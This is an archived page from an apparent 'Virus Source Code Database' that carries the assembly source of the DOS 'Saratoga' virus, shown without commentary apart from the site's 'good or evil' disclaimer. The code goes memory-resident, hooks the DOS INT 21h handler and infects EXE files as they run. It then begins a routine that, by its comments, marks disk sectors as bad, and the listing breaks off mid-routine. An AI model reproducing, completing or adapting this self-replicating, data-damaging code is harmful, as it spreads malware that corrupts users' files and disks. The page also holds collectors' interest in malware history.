<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: saratoga_asm</title>
<meta name="KEYWORDS" content="saratoga.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for saratoga.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="s2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s2_asm.php">s2_asm</a><br>
<a href="sabbath_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sabbath_asm.php">sabbath_asm</a><br>
<a href="sad_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sad_asm.php">sad_asm</a><br>
<a href="saddam_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/saddam_pas.php">saddam_pas</a><br>
<a href="sample_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sample_asm.php">sample_asm</a><br>
<a href="santa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/santa_asm.php">santa_asm</a><br>
<a href="saratoga_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/saratoga_asm.php">saratoga_asm</a><br>
<a href="satanbg_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/satanbg_asm.php">satanbg_asm</a><br>
<a href="satanbug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/satanbug_asm.php">satanbug_asm</a><br>
<a href="satnlh_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/satnlh_asm.php">satnlh_asm</a><br>
<a href="sbwhywin_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sbwhywin_asm.php">sbwhywin_asm</a><br>
<a href="sc89_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sc89_asm.php">sc89_asm</a><br>
<a href="s_canada_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s_canada_asm.php">s_canada_asm</a><br>
<a href="scarey_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scarey_asm.php">scarey_asm</a><br>
<a href="schrunch_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/schrunch_asm.php">schrunch_asm</a><br>
<a href="scorpio_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scorpio_pas.php">scorpio_pas</a><br>
<a href="scramble_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scramble_asm.php">scramble_asm</a><br>
<a href="screw_fi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/screw_fi_asm.php">screw_fi_asm</a><br>
<a href="scroll__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scroll__asm.php">scroll__asm</a><br>
<a href="scroll_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scroll_asm.php">scroll_asm</a><br>
<a href="scrunch_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scrunch_asm.php">scrunch_asm</a><br>
<a href="sdfe_gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sdfe_gen_asm.php">sdfe_gen_asm</a><br>
<a href="seneca_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/seneca_asm.php">seneca_asm</a><br>
<a href="senecab_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/senecab_asm.php">senecab_asm</a><br>
<a href="sent4625_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sent4625_pas.php">sent4625_pas</a><br>
<a href="sentinel_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sentinel_pas.php">sentinel_pas</a><br>
<a href="serg114_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/serg114_asm.php">serg114_asm</a><br>
<a href="serg118e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/serg118e_asm.php">serg118e_asm</a><br>
<a href="sergant_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sergant_asm.php">sergant_asm</a><br>
<a href="setuprot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/setuprot_asm.php">setuprot_asm</a><br>
<a href="sex666_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sex666_asm.php">sex666_asm</a><br>
<a href="sf_ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sf_ii_asm.php">sf_ii_asm</a><br>
<a href="sgarden_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sgarden_asm.php">sgarden_asm</a><br>
<a href="shake_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shake_asm.php">shake_asm</a><br>
<a href="s_happy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s_happy_asm.php">s_happy_asm</a><br>
<a href="shellt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shellt_asm.php">shellt_asm</a><br>
<a href="shhs__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shhs__asm.php">shhs__asm</a><br>
<a href="shhs_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shhs_asm.php">shhs_asm</a><br>
<a href="shimmer2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shimmer2_asm.php">shimmer2_asm</a><br>
<a href="shimmer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shimmer_asm.php">shimmer_asm</a><br>
<a href="shock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shock_asm.php">shock_asm</a><br>
<a href="shy_koo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shy_koo_asm.php">shy_koo_asm</a><br>
<a href="shy-koo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shy-koo_asm.php">shy-koo_asm</a><br>
<a href="silence2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/silence2_asm.php">silence2_asm</a><br>
<a href="silence_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/silence_asm.php">silence_asm</a><br>
<a href="simplex_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/simplex_asm.php">simplex_asm</a><br>
<a href="sister_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sister_asm.php">sister_asm</a><br>
<a href="sist_j4j_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sist_j4j_asm.php">sist_j4j_asm</a><br>
<a href="sk1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sk1_asm.php">sk1_asm</a><br>
<a href="sk20h_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sk20h_asm.php">sk20h_asm</a><br>
<a href="sk2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sk2_asm.php">sk2_asm</a><br>
<a href="sk_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sk_asm.php">sk_asm</a><br>
<a href="skeleton_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/skeleton_asm.php">skeleton_asm</a><br>
<a href="skism808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/skism808_asm.php">skism808_asm</a><br>
<a href="s_leszop_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s_leszop_asm.php">s_leszop_asm</a><br>
<a href="smash_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/smash_asm.php">smash_asm</a><br>
<a href="smile_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/smile_asm.php">smile_asm</a><br>
<a href="smlboot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/smlboot_asm.php">smlboot_asm</a><br>
<a href="smurf__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/smurf__asm.php">smurf__asm</a><br>
<a href="smurf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/smurf_asm.php">smurf_asm</a><br>
<a href="sobj3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sobj3_asm.php">sobj3_asm</a><br>
<a href="sound_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sound_asm.php">sound_asm</a><br>
<a href="spawn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/spawn_asm.php">spawn_asm</a><br>
<a href="sq2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sq2_asm.php">sq2_asm</a><br>
<a href="squish_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/squish_asm.php">squish_asm</a><br>
<a href="sra1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sra1__asm.php">sra1__asm</a><br>
<a href="sra2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sra2__asm.php">sra2__asm</a><br>
<a href="sra2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sra2_asm.php">sra2_asm</a><br>
<a href="sra3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sra3_asm.php">sra3_asm</a><br>
<a href="ssss4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/ssss4_asm.php">ssss4_asm</a><br>
<a href="stack__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stack__asm.php">stack__asm</a><br>
<a href="stack_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stack_asm.php">stack_asm</a><br>
<a href="stackvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stackvir_asm.php">stackvir_asm</a><br>
<a href="stealth__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stealth__asm.php">stealth__asm</a><br>
<a href="stealth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stealth_asm.php">stealth_asm</a><br>
<a href="ster1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/ster1_asm.php">ster1_asm</a><br>
<a href="ster2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/ster2_asm.php">ster2_asm</a><br>
<a href="stercul2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stercul2_asm.php">stercul2_asm</a><br>
<a href="sterculi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sterculi_asm.php">sterculi_asm</a><br>
<a href="stioxyl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stioxyl_asm.php">stioxyl_asm</a><br>
<a href="stned_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stned_asm.php">stned_asm</a><br>
<a href="sto_drop_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sto_drop_asm.php">sto_drop_asm</a><br>
<a href="stond____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stond____asm.php">stond____asm</a><br>
<a href="stond_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stond_asm.php">stond_asm</a><br>
<a href="stone_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stone_asm.php">stone_asm</a><br>
<a href="stoned1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned1_asm.php">stoned1_asm</a><br>
<a href="stoned_2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned_2_asm.php">stoned_2_asm</a><br>
<a href="stoned2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned2_asm.php">stoned2_asm</a><br>
<a href="stoned3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned3_asm.php">stoned3_asm</a><br>
<a href="stoned4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned4_asm.php">stoned4_asm</a><br>
<a href="stoned___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned___asm.php">stoned___asm</a><br>
<a href="stoned_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned_asm.php">stoned_asm</a><br>
<a href="stoned_f_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned_f_asm.php">stoned_f_asm</a><br>
<a href="stonedii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stonedii_asm.php">stonedii_asm</a><br>
<a href="stoneds_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoneds_asm.php">stoneds_asm</a><br>
<a href="stone-ef_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stone-ef_asm.php">stone-ef_asm</a><br>
<a href="stranger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stranger_asm.php">stranger_asm</a><br>
<a href="stub_____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stub_____asm.php">stub_____asm</a><br>
<a href="stub____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stub____asm.php">stub____asm</a><br>
<a href="stub___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stub___asm.php">stub___asm</a><br>
<a href="stub__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stub__asm.php">stub__asm</a><br>
<a href="stub_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stub_asm.php">stub_asm</a><br>
<a href="sturm&amp;_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sturm&_asm.php">sturm&_asm</a><br>
<a href="styx-5b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/styx-5b_asm.php">styx-5b_asm</a><br>
<a href="sumsdos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sumsdos_asm.php">sumsdos_asm</a><br>
<a href="sundevil_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sundevil_asm.php">sundevil_asm</a><br>
<a href="suriv101_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/suriv101_asm.php">suriv101_asm</a><br>
<a href="suriv_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/suriv_asm.php">suriv_asm</a><br>
<a href="survive__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/survive__asm.php">survive__asm</a><br>
<a href="survive_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/survive_asm.php">survive_asm</a><br>
<a href="susan1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/susan1__asm.php">susan1__asm</a><br>
<a href="susan1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/susan1_asm.php">susan1_asm</a><br>
<a href="susan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/susan_asm.php">susan_asm</a><br>
<a href="swansngb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/swansngb_asm.php">swansngb_asm</a><br>
<a href="swansong_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/swansong_asm.php">swansong_asm</a><br>
<a href="swap_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/swap_asm.php">swap_asm</a><br>
<a href="sw__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sw__asm.php">sw__asm</a><br>
<a href="sw_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sw_asm.php">sw_asm</a><br>
<a href="swedish__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/swedish__asm.php">swedish__asm</a><br>
<a href="swedish_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/swedish_asm.php">swedish_asm</a><br>
<a href="s_wxyc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s_wxyc_asm.php">s_wxyc_asm</a><br>
<a href="s-wxyc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s-wxyc_asm.php">s-wxyc_asm</a><br>
<a href="sylvia_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sylvia_asm.php">sylvia_asm</a><br>
<a href="sysinfct_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sysinfct_asm.php">sysinfct_asm</a><br>
<a href="syslock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/syslock_asm.php">syslock_asm</a><br>
<a href="syslockm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/syslockm_asm.php">syslockm_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;The saratoga Virus

.RADIX 16

INT21_OFF EQU 84H 
INT21_SEG EQU 86H        



 

 
;******************************************************************************
;The following segment is the host program, which the virus has infected.
;Since this is an EXE file, the program appears unaltered, but the startup
;CS:IP in the EXE header does not point to it.

host_code       SEGMENT byte
		ASSUME CS:host_code
		ORG     0h
HOST:
		MOV     AX,4C00H                ;viral host program
		INT     21H                     ;just terminates

		db      0bh dup (0)    
		db      20H dup (0)
host_code       ENDS

vgroup          GROUP virus_code

virus_code      SEGMENT byte
		ASSUME CS:virus_code, ds:host_code

	ORG     0    
	DB      5AH
	DB      8AH,0CH
	DB      80H 
	DB      0cH  DUP (0)    
;this is where the virus starts in the file the area above is used as
; a MCB block when the virus goes tsr

;this first piece of code sets up the stack so the virus can use
;a retf later to got to the host code

START:                                          
	SUB     SP,+04H
	PUSH    BP
	MOV     BP,SP
	PUSH    AX
	MOV     AX,ES
	 
	;ADD     AX,10H
		DB      05H
HOST_CS         DW      0010H
	
	MOV     [BP+04H],AX
	
	;MOV     [BP+02H],0000
		DB      0C7H, 46H, 02H      
HOST_IP         DW      OFFSET HOST
	
	PUSH    ES                                   ; save regs
	PUSH    DS                                   ;
	PUSH    BX                                   ;
	PUSH    CX                                   ;
	PUSH    SI                                   ;
	PUSH    DI                                   ;

;check if virsu is in memory if FF is located at 0000:37fh then it  
; is in memory and we jump to the ret_host code        

	XOR     AX,AX
	MOV     ES,AX
	CMP     BYTE PTR ES:[037FH],0FFH
	JNZ     NOT_IN_MEM

RET_HOST:
	POP     DI
	POP     SI
	POP     CX
	POP     BX
	POP     DS
	POP     ES
	POP     AX
	POP     BP
	RETF

;if virus is not in memory it jumps to here where it sets its marker that
;tells if it is in memory

NOT_IN_MEM:
	MOV     BYTE PTR ES:[037FH],0FFH


	MOV     AH,52H                          ;used int 21 52h 
	INT     21H                             ;list of list

	MOV     AX,ES:[BX-2H]                   ;LOCATION OF FIRST MCB
	MOV     ES,AX                           ;SEGMENT
	ADD     AX,ES:[03H]                     ;GET SIZE OF MEMORY BLOCK
	INC     AX                              ;CONTROLED BY THIS MCB
	INC     AX                              ;ADD 2 TO THIS
	MOV     WORD PTR CS:[0001H],AX          ;SAVE THIS VALUE IN OUR CODE
						;

;ADJUST OUR MCB TO BE 2MEG LESS THAN WHAT IT WAS 
;AND MOVE OUR CODE TO THIS 2MEG AREA

ASSUME  DS:HOST_CODE                    ;SO IT WILL ASSEMBLY CORRECTLY
	
	MOV     BX,DS
	DEC     BX
	MOV     DS,bX
	MOV     AL,4DH
	MOV     BYTE PTR DS:[0000H],AL
	MOV     AX,WORD PTR DS:[0003H]
	SUB     AX,80H
	MOV     WORD PTR DS:[0003H],AX
	ADD     BX,AX
	INC     BX

	MOV     ES,BX
	XOR     SI,SI
	XOR     DI,DI
	PUSH    CS
	POP     DS
	MOV     CX,7D0H
	CLD
	REPZ
	MOVSB
; CODE IS NOW IN ITS OWN MEMORY BLOCK COMPLETE WITH ITS OWN MCB WHICH SAYS
; IT PART OF COMMAND.COM - 8088
;OR IS SOMETHING CALLED I/O.SYS - 486
; NEXT PIECE OF CODE WILL PUT US IN THAT TSR MEMORY
	PUSH    ES
	MOV     AX,OFFSET HOOK_INT21
	PUSH    AX
	RETF                             

; NOW WE HOOK THE INTERRUPTS BY DIRECTLY PLAYING WITH THE INTERUPTS TABLE
;

ASSUME DS:VIRUS_CODE

HOOK_INT21:
	XOR     AX,AX
	MOV     ES,AX
	
	MOV     AX,ES:[INT21_OFF]
	MOV     CS:[OLD_INT21_OFF],AX

	MOV     AX,ES:[INT21_SEG]
	MOV     CS:[OLD_INT21_SEG],AX

	MOV     AX,CS
	MOV     ES:[INT21_SEG],AX

	MOV     AX,OFFSET VIR_INT21
	MOV     ES:[INT21_OFF],AX

	JMP     RET_HOST                ; DONE LET THE HOST PROGRAM RUN

;THIS IS THE SARATOGA INT 21 H HANDLER
;IT SIMPLY ASK 1 IS IT A 4B (EXEC) CALL 
;IF YES IT ASKED IS IT THE SECOND EXEC CALL
;IF NOT DECREMENT COUNTER AND LET DOS HANDLE THE CALL
;IF IT IS WE RESET THE COUNTER 
;AND CHECK IF IT IS A EXE FILE BEING EXEC
;IF NOT LET DOS DO ITS STUFF 
;OTHERWISE INFECT

VIR_INT21:
	CMP     AH,4BH
	JE      CONT_INF    
	
DOS_21:
	DB      0EAH

OLD_INT21_OFF       DW      ?
OLD_INT21_SEG       DW      ?

CONT_INF:
	DEC     BYTE PTR CS:[COUNTER]
	JNZ     DOS_21
	
	MOV     BYTE PTR CS:[COUNTER],02
	;DB      90
	PUSH    AX
	PUSH    BX
	PUSH    CX
	PUSH    DX
	PUSH    SI
	PUSH    DS
	
	MOV     BX,DX

NAME_LOOP:
	INC     BX
	CMP     BYTE PTR [BX],'.'
	JE      FOUND_PERIOD
	CMP     BYTE PTR [BX],00H
	JNE     NAME_LOOP

EXIT_GOTO_DOS21:
	POP     DS
	POP     SI
	POP     DX
	POP     CX
	POP     BX
	POP     AX
	JMP     DOS_21


FOUND_PERIOD:
	INC     BX
	CMP     WORD PTR [BX],'XE'
	JNE     EXIT_GOTO_DOS21

	MOV     AX,4300H
	INT     21H
	JB      EXIT_GOTO_DOS21
;IF ARRIVED HERE THE VIRUS TRIES TO INFECT THE FILE
;FIRST CHANGING THE FILE TO READ/WRITE STATUS
;NOT SAVING OLD ATTRIBUTE
;THEN IT OPENS IT READ THE EXE HEADER THEN READS THE LAST FOUR BYTES AND 
;CHECKS FOR 50H 6FH 6FH 54H "PooT" 
; IF IT IS THERE EXIT OTHERWISE WRITE CODE TO BOTTOM OF HOST
; ALTER EXE SO IT CALLS VIRUS FIRST
; IF THIS ALL SUCCEDS THEN WE CHECK FOR HARD DRIVES GREATER THAN
;10 MEG IF FOUND MARK A UNUSED SECTOR AS BAD
; AND LET DOS DO THE REST

	MOV     AX,4301H
	AND     CX,00FEH
	INT     21H
	JB      EXIT_GOTO_DOS21

	MOV     AX,3D02H
	INT     21H
	JB      EXIT_GOTO_DOS21

	MOV     BX,AX                   ;SAVE FILE HANDLE IN BX

	PUSH    CS
	POP     DS
	
	MOV     DX,OFFSET DBUF_1
	MOV     CX,001CH
	MOV     AH,3FH
	INT     21H
	JB      close_DOS21            

	MOV     AX,ds:[H_INIT_IP]
	;MOV     AX,ds:[29ah]
	
	MOV     WORD PTR ds:[HOST_IP],AX
	;MOV     WORD PTR ds:[22h],AX

	MOV     AX,ds:[H_INIT_CS]
	;MOV     AX,ds:[29cH]


	ADD     AX,0010H

       MOV     WORD PTR ds:[HOST_CS],AX
	;MOV     WORD PTR ds:[1ah],AX


	MOV     AX,4202H
	MOV     CX,0FFFFH
	MOV     DX,0FFFCH
	INT     21H
	JB      close_DOS21

	ADD     AX,04H
	
	MOV     WORD PTR ds:[HOST_LENG],AX
	;MOV     WORD PTR ds:[27ah],AX


	JNB     CONT1
	INC     DX
CONT1:
	MOV     WORD PTR ds:[HOST_LENG1],DX
	;MOV     WORD PTR ds:[27ch],DX


	MOV     AH,3FH
	MOV     CX,004H
	MOV     DX,OFFSET CHECK_INF
	INT     21H
	JNB     NO_ERROR1

CLOSE_DOS21:
	MOV     AH,3EH
	INT     21H
	JMP     EXIT_GOTO_DOS21

NO_ERROR1:

	MOV     SI,OFFSET CHECK_INF
	MOV     AX,ds:[SI]
	CMP     AX,6F50H
	JNE     NOT_INFECTED
	MOV     AX,ds:[SI+02]
	CMP     AX,546FH
	JE      CLOSE_DOS21

NOT_INFECTED:
	MOV     AX,ds:[HOST_LENG]
	AND     AX,000FH
	JZ      WRITE_VIRUS

	MOV     CX,0010H
	SUB     CX,AX
	ADD     ds:[HOST_LENG],CX
	JNB     ADD_SPACE
	INC     WORD PTR ds:[HOST_LENG1]

ADD_SPACE:
	MOV     AH,40H
	INT     21H

	JB      CLOSE_DOS21

WRITE_VIRUS:
	XOR     DX,DX
	MOV     CX,OFFSET VGROUP:END_VIRUS
	MOV     AH,40H
	INT     21H

; ADJUST AND WRITE NEW EXE HEADER TO NEW HOST
	jb      close_dos21
	MOV     AX,0010H
	MOV     WORD PTR ds:[H_INIT_IP],AX

	MOV     DX,ds:[HOST_LENG1]
	MOV     AX,ds:[HOST_LENG]

	SHR     DX,1
	RCR     AX,1
	
	SHR     DX,1
	RCR     AX,1
	
	SHR     DX,1
	RCR     AX,1
	
	SHR     DX,1
	RCR     AX,1

	SUB     AX,ds:[HEADER]
	MOV     ds:[H_INIT_CS],AX
	ADD     WORD PTR ds:[HOST_LENG],OFFSET VGROUP:END_VIRUS
	JNB     CONT2
	INC     WORD PTR ds:[HOST_LENG1]

CONT2:
	MOV     AX,ds:[HOST_LENG]
	AND     AX,01FFH
	MOV     WORD PTR ds:[HLASTPS],AX
	
	MOV     DX,ds:[HOST_LENG1]
	MOV     AX,ds:[HOST_LENG]
	ADD     AX,01FFH
	JNB     CONT3
	INC     DX
CONT3:
	MOV     AL,AH
	MOV     AH,DL
	SHR     AX,1
	MOV     WORD PTR ds:[HLPCOUNT],AX

	MOV     AX,4200H
	XOR     CX,CX
	XOR     DX,DX
	INT     21H

	JB      EXIT_ERROR

	MOV     AH,40H
	MOV     DX,offset DBUF_1
	MOV     CX,1CH
	INT     21H

	JB      EXIT_ERROR
	MOV     AH,3EH
	INT     21H

	JNB     DAMAGE

EXIT_ERROR:        
	JMP     CLOSE_DOS21
	
DAMA_DATA       DW      0000H

DAMAGE: 
		MOV     AH,32
		MOV     DL,00
		INT     21H

		CMP     AL,0FFH
		JE      EX_DAMAGE

		XOR     AX,AX
		MOV     AL,[BX+04]
		INC     AX

		MOV     WORD PTR CS:[DAMA_DATA],AX
		MOV     AX,[BX+0Dh]
		DEC     AX

		MUL     WORD PTR CS:[DAMA_DATA]
		ADD     AX,[BX+0BH]

		JNB     CONT4
		INC     DX
CONT4:
